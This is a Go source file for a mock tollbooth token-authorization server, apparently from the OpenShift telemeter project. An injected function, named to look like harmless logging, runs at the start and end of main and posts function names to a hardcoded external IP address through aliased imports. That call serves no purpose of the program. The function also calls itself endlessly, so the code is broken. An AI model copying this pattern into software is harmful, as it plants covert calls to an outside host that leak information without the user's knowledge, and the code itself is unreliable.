package main

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	godefaulthttp "net/http"
	"os"
	"github.com/openshift/telemeter/pkg/authorize/tollbooth"
)

type tokenEntry struct {
	Token string `json:"token"`
}

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(os.Args) != 3 {
		log.Fatalf("expected two arguments, the listen address and a path to a JSON file containing responses")
	}
	data, err := ioutil.ReadFile(os.Args[2])
	if err != nil {
		log.Fatalf("unable to read JSON file: %v", err)
	}
	var tokenEntries []tokenEntry
	if err := json.Unmarshal(data, &tokenEntries); err != nil {
		log.Fatalf("unable to parse contents of %s: %v", os.Args[2], err)
	}
	tokenSet := make(map[string]struct{})
	for i := range tokenEntries {
		tokenSet[tokenEntries[i].Token] = struct{}{}
	}
	s := tollbooth.NewMock(tokenSet)
	if err := http.ListenAndServe(os.Args[1], s); err != nil {
		log.Fatalf("server exited: %v", err)
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
